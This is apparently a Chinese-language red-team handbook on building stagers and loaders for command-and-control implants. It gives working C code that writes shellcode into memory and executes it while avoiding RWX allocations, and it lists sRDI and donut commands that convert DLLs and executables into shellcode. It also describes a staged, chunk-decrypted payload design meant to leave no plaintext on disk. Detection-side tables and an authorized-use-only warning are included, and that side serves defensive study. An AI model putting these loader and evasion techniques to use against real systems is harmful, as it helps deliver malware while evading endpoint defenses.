# Stager 与 Loader 开发（STAGER_LOADER）

> 本文件为 `c2-custom-evasion.md` 技能文件索引的伴生手册（补齐断链）。
> 覆盖 Stager/Loader 的 **Shellcode 执行 → 反射加载 → 格式转换 → 检测侧 → 实测判据**。
> 授权立场见 `refs/README.md`；P1 语言模板见 `loader-language-templates.md`。

## 1. 定位

```
Stager：小体积下载器，负责拉取 Stage2（分阶段）
Loader：加载器，负责把 payload（shellcode/DLL/PE）在内存中执行
```

## 2. Shellcode 执行

```c
// 基础：RW -> 写 -> RX -> 执行（避免 RWX）
LPVOID sc = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
memcpy(sc, buf, len);
DWORD old; VirtualProtect(sc, len, PAGE_EXECUTE_READ, &old);
((void(*)())sc)();
```

**进阶执行方式**（规避 `CreateThread`/`VirtualAlloc(RWX)` 监控）见 `SHELLCODE_EVASION.md` §4。

## 3. 反射加载（Reflective Loading）

```c
// 反射加载 DLL：不落盘、不 LoadLibrary，自建 PE 加载器（见 PROCESS_INJECTION.md §3）
// 或转 shellcode：sRDI / donut 把 DLL/PE 转 PIC shellcode
// sRDI: python ConvertToShellcode.py -f payload.dll -o payload.bin
// donut: donut -f tool.exe -a 2 -o payload.bin
```

## 4. 格式转换

| 源 | 目标 | 工具 | 说明 |
|---|---|---|---|
| DLL | shellcode | sRDI | 反射加载壳 + 导出入口 |
| .NET EXE | shellcode | donut | 内嵌 CLR 运行时 |
| PE | shellcode | pe2shc | 自定义映射 |
| C 对象 | BOF/COFF | COFFLoader | beacon 内解析执行 |

## 5. 分阶段（Staging）

```c
// Stage1（小、加密、下载器）-> Stage2（加密 payload）-> 内存解密执行
// 关键：任何时刻磁盘无完整明文 payload；下载分块 + 逐块解密（见 SHELLCODE_EVASION.md §3）
```

## 6. 检测侧

| 环节 | 检测点 | 判据 |
|---|---|---|
| shellcode 执行 | RX + 匿名执行 | 内存保护 + 栈回溯 |
| 反射加载 | 自建 PE loader | sRDI/反射特征 |
| 格式转换 | donut 实例头 | "DONUT" 魔数 |
| staging | 下载 + 分块写执行区 | 网络遥测 + 写入-执行间隔 |

## 7. 实测判据

| 判据 | 方法 |
|---|---|
| loader 是否落地可执行 | 字符串/YARA 扫描 + 行为执行 |
| staging 是否隐蔽 | 抓包看下载体是否加密 + 分块 |

*WARNING: 授权红队评估与安全研究专用。*
